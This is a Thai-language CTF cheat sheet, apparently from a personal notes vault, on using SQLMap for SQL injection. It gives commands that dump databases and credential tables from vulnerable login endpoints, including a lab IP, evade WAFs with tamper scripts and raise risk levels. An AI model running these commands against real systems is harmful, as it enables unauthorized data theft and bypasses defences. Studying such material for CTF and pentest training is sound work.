#web
# What
- tool ไว้ทำ [[SQL Injection]] อัตโนมัติ
- ใช้กับ [[🌐 Web application]] ที่มีช่องโหว่ SQL
- รองรับหลาย DBMS: MySQL, PostgreSQL, MSSQL, Oracle, SQLite

# CTF Use Cases

## Scenario 1: Login Bypass & Data Extraction
เจอหน้า login ที่มีช่องโหว่ SQL injection สามารถใช้ SQLMap ดึงข้อมูล user และ password เพื่อ bypass [[Authentication]]
```bash
# ดึง database ทั้งหมดจาก vulnerable login endpoint
sqlmap -u "http://target.com/login?user=admin&pass=123" --dbs --batch
# ดึง credentials จาก users table
sqlmap -u "http://target.com/login?user=admin&pass=123" -D webapp -T users --dump
```

## Scenario 2: WAF Bypass & Advanced Extraction
เจอ [[🌐 Web application]] ที่มี WAF/IDS ป้องกัน ต้องใช้ tamper scripts และปรับ level/risk เพื่อหลีกเลี่ยงการตรวจจับ
```bash
# ใช้ tamper script เพื่อหลบ WAF
sqlmap -u "http://target.com/product?id=5" --tamper=space2comment --level=5 --risk=3 --dbs
# ใช้ request file จาก Burp Suite พร้อม bypass WAF
sqlmap -r request.txt --tamper=between,randomcase --batch --threads=10
```

## Scenario 3: POST Request Analysis
เจอ form ที่ส่งข้อมูลแบบ POST สามารถใช้ -r เพื่ออ่าน request จาก Burp Suite แล้วทดสอบ SQL injection
```bash
# บันทึก request จาก Burp Suite เป็น request.txt แล้วใช้ SQLMap
sqlmap -r request.txt -p username --dbs --batch
# ระบุ parameter เฉพาะที่ต้องการทดสอบ
sqlmap -r request.txt -p "email,password" --technique=BEUST --dump
```

# Command Examples

ดู database ทั้งหมด
```bash
sqlmap -u "http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf" --dbs
```

ดู tables ทั้งหมดใน database ai
```bash
sqlmap -u "http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf" -D ai --tables
```

ดู data ทั้งหมดใน table user จาก database ai
```bash
sqlmap -u "http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf" -D ai -T user --dump
```

ใช้ request file จาก Burp Suite (สำหรับ POST requests)
```bash
# บันทึก request จาก Burp เป็นไฟล์ request.txt
sqlmap -r request.txt --dbs --batch
```

ใช้ tamper scripts เพื่อหลบ WAF พร้อมปรับ level และ risk
```bash
# หลบ WAF ด้วย space2comment tamper script
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --level=3 --risk=2 --dbs --batch
```

เพิ่มความเร็วด้วย threads และ skip interactive prompts
```bash
# ใช้ 10 threads พร้อมตอบ yes ทุก prompt อัตโนมัติ
sqlmap -u "http://target.com/page?id=1" --threads=10 --batch --dbs
```

ระบุ parameter เฉพาะที่ต้องการทดสอบ
```bash
# ทดสอบเฉพาะ parameter 'id' และ 'search'
sqlmap -u "http://target.com/page?id=1&search=test&category=news" -p "id,search" --dbs
```

# Advanced Flags

## Request Handling
- `-r <file>` - อ่าน HTTP request จากไฟล์ (export จาก Burp Suite)
- `-p <param>` - กำหนด parameter ที่ต้องการทดสอบเฉพาะ
- `--data="POST_DATA"` - ส่งข้อมูล POST แบบ manual
- `--cookie="COOKIE"` - กำหนด cookie สำหรับการ authenticated requests
- `--headers="HEADER"` - เพิ่ม custom headers

## WAF Bypass
- `--tamper=<script>` - ใช้ tamper script เพื่อหลบ WAF/IDS
  - `space2comment` - แทนที่ space ด้วย comment
  - `between` - ใช้ BETWEEN แทน comparison operators
  - `randomcase` - สลับ upper/lowercase แบบสุ่ม
  - `charencode` - encode characters
- `--random-agent` - ใช้ User-Agent แบบสุ่ม

## Detection & Exploitation
- `--level=<1-5>` - ระดับการทดสอบ (default=1, max=5)
  - Level 1: GET parameters
  - Level 2: Cookie values
  - Level 3-5: User-Agent, Referer, และ headers อื่นๆ
- `--risk=<1-3>` - ระดับความเสี่ยงของ payloads (default=1, max=3)
  - Risk 1: Safe payloads
  - Risk 2-3: Heavy query/UPDATE/INSERT payloads

## Performance
- `--batch` - ตอบ yes ทุก prompt อัตโนมัติ (ไม่ต้อง interactive)
- `--threads=<n>` - จำนวน threads (default=1, max=10)
- `--time-sec=<n>` - เวลา delay สำหรับ time-based blind SQLi (default=5)
- `--technique=<BEUSTQ>` - เลือกเทคนิค: Boolean, Error, Union, Stacked, Time, Query

## Output
- `--dump` - ดึงข้อมูล table ทั้งหมด
- `--dump-all` - ดึงข้อมูลทุก table ในทุก database
- `-D <db>` - ระบุ database
- `-T <table>` - ระบุ table
- `-C <column>` - ระบุ column
- `--output-dir=<dir>` - กำหนด directory สำหรับเก็บผลลัพธ์

# Syntax Reference
- `-u <url>` - Target URL
- `--dbs` - enumerate databases
- `--tables` - enumerate tables
- `-D <database>` - ระบุ database name
- `-T <table>` - ระบุ table name
- `--dump` - ดึงข้อมูลออกมา
- `-r <file>` - อ่านไฟล์ request (จาก Burp Suite)
- `-p <param>` - กำหนดว่าจะเทส payload ตรงไหน
- `--batch` - skip interactive prompts
- `--threads=<n>` - จำนวน concurrent threads
- `--level=<1-5>` - ระดับการทดสอบ
- `--risk=<1-3>` - ระดับความเสี่ยงของ payloads
- `--tamper=<script>` - ใช้ tamper script เพื่อหลบ WAF

# Troubleshooting

## Problem: SQLMap ไม่เจอช่องโหว่แม้ว่ามีจริง
**Solutions:**
1. เพิ่ม `--level=5 --risk=3` เพื่อทดสอบแบบละเอียดขึ้น
2. ใช้ `--technique=BEUSTQ` เพื่อลองทุกเทคนิค
3. ระบุ parameter ด้วย `-p` แทนการ auto-detect
4. ลอง tamper scripts ต่างๆ ถ้ามี WAF

## Problem: WAF/IDS blocking requests
**Solutions:**
1. ใช้ `--tamper=space2comment,between,randomcase`
2. เพิ่ม `--random-agent` เปลี่ยน User-Agent
3. ลด `--threads=1` และเพิ่ม delay
4. ใช้ `--delay=2` เพื่อหน่วงเวลาระหว่าง requests

## Problem: SQLMap ช้าเกินไป
**Solutions:**
1. เพิ่ม `--threads=10` (ระวัง rate limiting)
2. ใช้ `--technique=U` (Union-based เร็วที่สุด)
3. ลด `--level=1 --risk=1` ถ้าไม่ต้องการความละเอียดสูง
4. ใช้ `--batch` เพื่อข้าม prompts

## Problem: ไม่สามารถทดสอบ POST request ได้
**Solutions:**
1. ใช้ Burp Suite ดัก request แล้ว save เป็นไฟล์
2. ใช้ `sqlmap -r request.txt` แทน `-u`
3. ตรวจสอบว่าไฟล์ request มี Content-Type header ครบถ้วน

## Problem: Authentication required
**Solutions:**
1. ใช้ `--cookie="session=xxx"` ส่ง session cookie
2. ใช้ `--auth-type=Basic --auth-cred=user:pass` สำหรับ Basic Auth
3. เพิ่ม headers ด้วย `--headers="Authorization: Bearer token"`

# Related Topics
- [[SQL Injection]] - เทคนิค SQL injection พื้นฐาน
- [[Authentication]] - การ bypass authentication
- [[🌐 Web application]] - การทดสอบ web applications
- [[Web Reconnaissance]] - การรวบรวมข้อมูลก่อนโจมตี